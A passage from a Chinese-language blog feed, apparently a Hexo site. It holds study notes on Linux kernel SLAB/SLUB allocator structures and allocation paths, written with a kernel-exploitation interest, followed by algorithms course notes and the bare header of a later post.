class="type">int</span> inuse;  </span><br><span class="line">    <span class="comment">// 对象按照指定的 align 进行对齐</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> align; </span><br><span class="line">    <span class="comment">// slab cache 的名称， 也就是在 slabinfo 命令中 name 那一列</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// info used for slab</span></span><br><span class="line"><span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有三个字段值得我们关注，一是flag，里面有很多各种各样的配置信息以及flag,比如是否64字节对齐，是否开启slab毒化，是否用red_zone防止OOB, 指定映射区域来自哪里（默认都是NORMAL）等等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Red zone objs in a cache */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_RED_ZONE  ((slab_flags_t __force)0x00000400U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Poison objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_POISON  ((slab_flags_t __force)0x00000800U)</span></span><br><span class="line"><span class="comment">/* Align objs on cache lines */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_HWCACHE_ALIGN ((slab_flags_t __force)0x00002000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA  ((slab_flags_t __force)0x00004000U)</span></span><br><span class="line"><span class="comment">/* Use GFP_DMA32 memory */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_CACHE_DMA32 ((slab_flags_t __force)0x00008000U)</span></span><br><span class="line"><span class="comment">/* DE<span class="doctag">BUG:</span> Store the last owner for bug hunting */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_STORE_USER </span></span><br></pre></td></tr></table></figure><p>二是开头的__percpu变量<br>6.11.5版本内核的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">void</span> **freelist;   <span class="comment">// 指向被 CPU 本地缓存的 slab 中第一个空闲的对象</span></span><br><span class="line">            <span class="comment">// 保证进程在 slab cache 中获取到的 cpu 本地缓存 kmem_cache_cpu 与当前执行进程的 cpu 是一致的。</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">freelist_aba_t</span> freelist_tid;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// slab cache 中 CPU 本地所缓存的 slab，</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="comment">// cpu cache 缓存的备用 slab 列表</span></span><br><span class="line">    <span class="comment">// 当被本地 cpu 缓存的 slab 中没有空闲对象时，内核会从 partial 列表中的 slab 中查找空闲对象</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="comment">// 记录 slab 分配对象的一些状态信息</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个cpu缓存是我们分配的主要来源。主要是里面缓存的一个slab和一个partial列表。后面在分配会讲到他们的用法。freelist将会成为后续我们pwn的对象之一。</p><p>最后一个字段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span><span class="comment">/* partial list first, better asm code */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> total_slabs;<span class="comment">/* length of all slab lists */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_slabs;<span class="comment">/* length of free slab list only */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_next;<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span><span class="comment">/* shared per node */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span><span class="comment">/* on other nodes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> next_reap;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="type">int</span> free_touched;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，如果使用slab，每个kmem节点要管理三个双向链表，分别是partial,full和free.顾名思义，partial管理有部分空闲对象的slab,full则管理已经全部被分配满的slab，free表示完全空闲的slab. 这三个链表是动态转化的，根据当前的分配情况实时移动。并且free太多会向buddy合并。</p><p>而使用slub的时候就直接删除了free和full链表，只保留了partial。</p><p>我们可以直接通过<code>cat /proc/slabinfo</code>查看当前所有的slab_cache。</p><h3 id="slab">slab</h3><p>从buddy system取来的页面被拆成一堆object放入了freelist构成我们的一个对象池。用这样一张图可以比较好的表示：</p><p><img src="/images/linux_mem/slab_struct.png" alt="slab1.png"></p><p>slab是管理内存分配和释放的基本单位。若干个slab也构成了一个池子被slab_cache管理，同时他们向上级buddy申请内存。</p><p>对于老一点的内核版本比如5.4，slab并没有单独的结构体进行管理，而是全部存储在page中。但随着内核的发展，我们需要对page结构体进行精简，也就将slab结构单独抽了出来从而减少page结构体的大小。但是page该有的指针什么的还是得有。</p><blockquote><p>linux-5.18.19</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* array of free object indexes */</span></span><br><span class="line"><span class="type">void</span> *s_mem;<span class="comment">/* first object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="type">void</span> *__unused_1;</span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free block */</span></span><br><span class="line"><span class="type">long</span> units;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freelist直接指向当前的空闲对象，每个空闲对象则同时以链表的形式相互连接。slab不单独维护空闲的对象，他们都是同时连续存放的，如果全free了就直接放进kmem_cache的free,只有partial的时候会用freelist-&gt;object.next这种形式连接一个内部空闲对象链表。</p><p>slab其实本身没啥内容，大头都让kmem_cache干了。</p><blockquote><p>旧版的slab采用一个描述符数组来管理对象的分配和释放，而且slab内同样维护了</p></blockquote><h3 id="Object">Object</h3><p>每个Object是由slab去分配，真正返回给内核程序使用的。只不过和chunk相比，Object似乎管理和结构都既更加简单又更加复杂。</p><p>说更加简单，是因为他们不需要像bin索引这样的方法，没有fdbk那么多东西，都是线性映射。顶天了也就是partial的遍历以下，直接slub用一个free_list指针指到没分配的对象，取的时候几乎是一键返回。</p><p>说更加复杂，是因为在内核中还有其他的奇怪机制（部分是可配置的）。比如防止越界读写的red_zone, 使用特殊字符填充object的slab_poison等等。前者是会在object两侧空余空间防越界读写（和内存对齐结合起来利用），后者则是用0x6b填充对象并以0x5a结尾，在它们释放或者刚从buddy取出的时候。另外还需要其他的track信息来附加在object末尾，因此最后一个object大概是这样的结构：</p><p><img src="/images/linux_mem/object.png" alt="object.png"></p><h2 id="分配与释放（简化概述）">分配与释放（简化概述）</h2><blockquote><p><a href="https://segmentfault.com/a/1190000043626203#item-6">https://segmentfault.com/a/1190000043626203#item-6</a><br>写得很好，我只是自己理解后抄一遍罢了，很难想象理解这么深刻的大佬能写和画的这么直观</p></blockquote><h3 id="分配">分配</h3><ul class="lvl-0"><li class="lvl-2"><p>从cpu缓存中直接分配，kmem_cpu_cache-&gt;slab取，我们称为快速路径，如果有空闲对象freelist直接取出对象返回</p></li><li class="lvl-2"><p>freelist为空，kmem_cpu_cache-&gt;slab已经满，则从cpu缓存partial中分配，我们称为慢速路径，需要遍历查看，找到能分配的slab后将该slab提升至cache并分配</p></li><li class="lvl-2"><p>partial也被取完了，则要返回kmem_cache结构，从node的partial链表中找，遍历一遍，同样找到后提升至cpu_cache, 并且将剩余的slab全部连接到cpu_cache-&gt;partial下（数量有限制）</p></li><li class="lvl-2"><p>全空了（比如刚创建），从buddy申请，依据kmem_cache的字段去要，要到slab直接提升到cpu缓存</p></li><li class="lvl-2"><p>拿到后会经过池化，slab poison等等细节操作不再赘述</p></li></ul><h3 id="释放">释放</h3><ul class="lvl-0"><li class="lvl-2"><p>如果释放的对象在cpu_cache-&gt;slab中，那就直接放回该slab并修正freelist指针，我们称为快速路径</p></li><li class="lvl-2"><p>如果释放的对象在cpu_cache-&gt;partial中，也是直接放回然后修改free_list和pointer</p></li><li class="lvl-2"><p>如果释放的对象在kmem_cache_node-&gt;partial中，也是直接放回</p></li><li class="lvl-2"><p>如果对象释放后，原本的full变为了partial，且不在cpu本地缓存中，那么内核会将这个slab重新插入到cpu_cache的partial链表中。</p></li></ul><blockquote><p>因为 slab 之前之所以是一个 full slab，恰恰证明了该 slab 是一个非常活跃的 slab，常常供不应求导致变成了一个 full slab，当对象释放之后，刚好变成 partial slab，这时需要将这个被频繁访问的 slab 放入 cpu 缓存中，加快下次分配对象的速度。</p></blockquote><p>当然，cpu_cache是很宝贵的，我们不能什么都往里塞。kmem_cache-&gt;cpu_partial规定了一个数量，超过的话就会将所有的cpu partial转移到kmem_node的partial中。这个检查是第一位的。这也是有说法的：</p><blockquote><p>CPU partial爆炸的时候，说明内核当前所处的场景是一个内存释放频繁的场景。kmem_cache_cpu-&gt;partial 链表太满了，而内存分配的请求又不是很多，kmem_cache_cpu 中缓存的 slab 并不会频繁的消耗。这样一来，就需要将链表中的所有 slab 一次性转移到 NUMA 节点缓存 partial 链表中备用。</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>如果对象释放后，slab从partial变成了empty，内核会将该slab插入节点缓存，也就是kmem_cache_node-&gt;partial中</p></li></ul><p>舍弃了slab中的empty，全放进partial的话就需要一些流程。kmem_cache-&gt;min_partial中规定了node中缓存的slab个数上限。partial超过这个值会将所有的empty slab回收至buddy system.这个检查也是插入前优先进行</p><h2 id="总结">总结</h2><p>至此，slab/slub的架构如下：</p><p><img src="/images/linux_mem/construct.png" alt="architect.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们都知道，进程内部寻址用的是虚拟地址，虚拟地址要经过mmu被映射到物理地址，进程的页表是独立的等等。但是那么多页表，内核又是怎么调度页表的呢？在我们向内核申请下一个4kb的时候究竟发生了什么？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考自：&lt;a href=&quot;https:</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="kernel" scheme="http://example.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm(0)</title>
    <link href="http://example.com/2024/10/28/Algorithm-0/"/>
    <id>http://example.com/2024/10/28/Algorithm-0/</id>
    <published>2024-10-28T08:20:57.000Z</published>
    <updated>2024-12-02T09:16:28.851Z</updated>
    
    <content type="html"><![CDATA[<h1>C++模板库的使用</h1><p>主要包括：</p><ol><li class="lvl-3">序列式容器：array（定长），vector（单向插入），deque（双向插入），list（双向链表），forwardlist（单向链表）</li><li class="lvl-3">关联式容器（节点组成的红黑树）：set（集合，有序存储互异元素），multiset（允许相等），map（键值对，字典/hashmap），multimap（允许key相等）</li><li class="lvl-3">无序（关联式容器）：unordered_set/multiset, unordered_map/multimap，无序，只关心存在</li></ol><h2 id="基础，熟悉输入输出">基础，熟悉输入输出</h2><ul class="lvl-0"><li class="lvl-2"><p>size clear等基本方法</p></li><li class="lvl-2"><p>迭代器</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = data.<span class="built_in">begin</span>(); iter != data.<span class="built_in">end</span>(); iter++)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> iter=data.<span class="built_in">begin</span>();...;...)</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>scanf输入 printf输出 在C++中使用他们也更好</p></li><li class="lvl-2"><p>长字符串换行</p></li><li class="lvl-2"><p>开double 开longlong</p></li></ul><h1>基础算法</h1><blockquote><p>main函数必须是int返回必须return0</p></blockquote><h2 id="暴力破解">暴力破解</h2><p>枚举骗分</p><p>包含头文件<code>#include&lt;algorithm&gt;</code>，里面有常用的容器算法，包括排序，查找等等，不用造轮子。</p><p>头文件<code>#include&lt;ctype.h&gt;</code>包含大小写转换，字母数字判断</p><p>打表，用事先写好的常量字符串优化程序</p><h2 id="模拟">模拟</h2><h1>课堂算法分析笔记Lesson1</h1><h2 id="背包问题的求解">背包问题的求解</h2><p>贪心</p><h2 id="多项式时间算法">多项式时间算法</h2><p>输入长度翻倍，运行时间最多会慢常数倍。也就是说，我们不希望随着n的增长，多消耗的时间被n影响太多。1：1的增长已经很好了。多项式算法中，a和b通常不会太大</p><h2 id="渐进分析">渐进分析</h2><ul class="lvl-0"><li class="lvl-2"><p>渐进上界：$O(g(n))$意味着，对于fn来说，存在一个足够大的c和n0，满足任意的$n&gt;=n_0$，$0&lt;=f(n)&lt;=cg(n)$。“最差情形”</p></li><li class="lvl-2"><p>渐进下界：同理的说法，存在c在n足够大的时候…</p></li><li class="lvl-2"><p>渐进紧界：既是又是，例子：fn=32n2+17n+1，n2既是上界又是下界</p></li></ul><blockquote><p>任何基于比较的排序算法最差情况下都需要比较至少$O(nlogn)$次 —-这是错的时间复杂度的限制并不限制做几遍，logn我二分查10次也是logn<br>循环数组查找：可以确定拐点加左右二分</p></blockquote><h1>Lesson2 图</h1><ul class="lvl-0"><li class="lvl-2"><p>连通性问题</p></li><li class="lvl-2"><p>最短路径</p></li><li class="lvl-2"><p>搜索<br>BFS树：按BFS搜索顺序（每一层Li画树的一层），中间连虚线（可以不画）</p></li></ul><blockquote><p>结论：原图中有边的两个点在BFS树中层数至多相差1<br>停止：所有当前轮次的点的邻居都已经出现在已搜索过的点集里<br>事实上，只要通过一个确定性的步骤（未必是BFS,DFS），每次找邻居，总能找到所有点。只是代码逻辑会清晰</p></blockquote><p>连通分支：一个<strong>点集</strong>而非一个子图。包含S的连通分支指从s出发能到达的点集</p><p>DFS树</p><p>有向图，强连通（相互可到达）——强连通的判断（Kosaraju算法，反向边两次BFS）为什么？</p><p>有向无环图（DAG）和拓扑排序：如果g中包含一个拓扑排序，则G必定是一个有向无环图</p><p><strong>如何选择数据结构：看我们在干嘛，增删查改哪个更多，不同的数据结构擅长不同的操作</strong> 如DAG的拓扑排序：总是查找某个（入边）量最小的点–优先队列</p><h1>Lesson3 贪心</h1><p>大方向只有 贪心 分治 动态规划<br>按某种顺序排序，贪心的关键是确定比较的依据</p><h2 id="区间调度问题">区间调度问题</h2><p>记一下最少冲突区间的反例图<br>算法反例 必考</p><p>反证最早完成时间是最优策略：假设它不最优然后和最优对比，找最开始不一样的一项</p><p><strong>保持领先证明贪心算法的任意性/最优解</strong>：和一个假想的”最优解”相比，采用该算法在每一步都不会获得更差的结果，即可说明该算法最优，递推证明，第一步…第k步都对了，第k+1步也是对的</p><p><strong>最小化延迟调度</strong>倒置？</p><blockquote><p>如果有倒置那么必定有相邻倒置：反证，对任意一个不相邻的倒置a和b,那么两者之间夹的任务要么和a倒置要么和b倒置，要么，c比a早和a出现倒置，要么c比a晚和b倒置然后，交换两个相邻倒置，不会对延迟有任何增大的变化并且会减少倒置</p></blockquote><p><strong>交换论证证明贪心算法的任意性/最优解:</strong> 和一个任意序列相比，通过按照我们的贪心指标交换两个该序列的元素让结果更靠近我们的算法而且结果并不会更差。反复交换即可说明我们的算法是最优解。反证证明，对任意序列按指标两两交换直到结果是我们的贪心策略。</p><h1>Lesson4 分治</h1><p>递推 f(n)=2f(n/2)+O(n) nlogn的来历每层的“治”都是On合并，一共有logn层，画递归树</p><p>不同的a和b要会算总的复杂度 f(n)=af(n/b)+O(n)，递推</p><p>如果是f(n)=T(n)+O(n2)，那么结果是n方而非n方logn</p><h2 id="逆序对计算">逆序对计算</h2><p>暴力:n^2扫描</p><p>分治：拆开算之后，关键是统计合并起来有多少逆序对。先排序之后然后指针扫描一遍，因为排好了所以右侧的全部逆序，扫一遍On即可。</p><p>归并排序</p><h2 id="最近点对问题">最近点对问题</h2><h2 id="主定理">主定理</h2><p>常见分治递归的通解：三个分治算法的参数abf$T(n)=aT(n/b)+f(n)$，分别对应子问题数量，大小减小规模，组合子问题的复杂度</p><p>通项公式——几何级数求和（等比数列）。见ppt，判断r和1的大小关系，只对n的c次幂适用</p><h2 id="分治乘法">分治乘法</h2><h1>Lesson5 动态规划DP</h1><blockquote><p>解过的不要再解</p></blockquote><h2 id="加权区间调度">加权区间调度</h2><p>找最大权重子集。我们没有通项，但是希望能用目标结果的更小下标的递推式表示</p><p>选择第j项？不选第j项？逐个缩减问题规模。我们总是希望将OPT(n)用1-n-1表示，然后对n讨论。</p><h3 id="暴力">暴力</h3><p>本质是有一些顺序的枚举。最好最坏情况？能缩减更多规模的机会 最差$2^n$，递归二叉树</p><h3 id="自顶向下动态规划（备忘录）">自顶向下动态规划（备忘录）</h3><p>模拟一次递归返回的过程。暂存子问题j的结果在M[j]中，瓶颈在排序，最后就遍历一遍就行了。</p><h2 id="背包问题">背包问题</h2><p>贪心的核心是排序指标，DP的核心是定义重叠子问题</p><p>同时考虑物品和包重量。如果不选i,那就是<code>OPT(i-1,w)</code>，如果选了，就对应缩小包的空间<code>OPT(I-1,w-wi)+Vi</code>。填一张二维的表</p><p>回溯看来源，时间复杂度$O(nW)$，W是输入的变量，不代表他关于n是多项式时间。但是算法严重依赖于重量是整数的假设。</p><h2 id="字符串对齐">字符串对齐</h2><h1>Lesson6 最小流和最大割</h1><p>并查集？？唉</p><h1>LessonN 线段树</h1><p>堆式存储 查询2logn求和</p><p>Lazy Tag 对上负责？</p><p>每一行最多只有两个蓝色区间和2个红色区间</p><p>批量修改会在能覆盖的地方就停，然后直到下次查询再修改。</p><p>多个lazy tag,优先高的先下传</p><p>统计量可合并可以使用</p><h2 id="树状数组">树状数组</h2><p>无需额外空间 长度仍然n<br>修改对应位置 线段树加前缀</p><h1>Lesson N+1 kmp算法——字符串匹配</h1><p>依据一张部分匹配表快速跳过$O(m+n)$</p><h1>多项式时间规约</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;C++模板库的使用&lt;/h1&gt;
&lt;p&gt;主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li class=&quot;lvl-3&quot;&gt;序列式容器：array（定长），vector（单向插入），deque（双向插入），list（双向链表），forwardlist（单向链表）&lt;/li&gt;
&lt;li class=</summary>
      
    
    
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>记录一次护网行动</title>
    <link href="http://example.com/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/"/>
    <id>http://example.com/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/</id>
    <published>2024-10-18T11:17:47.000Z</published>
    <updated>2024-10-19T03:32:36.416Z</updated>
    
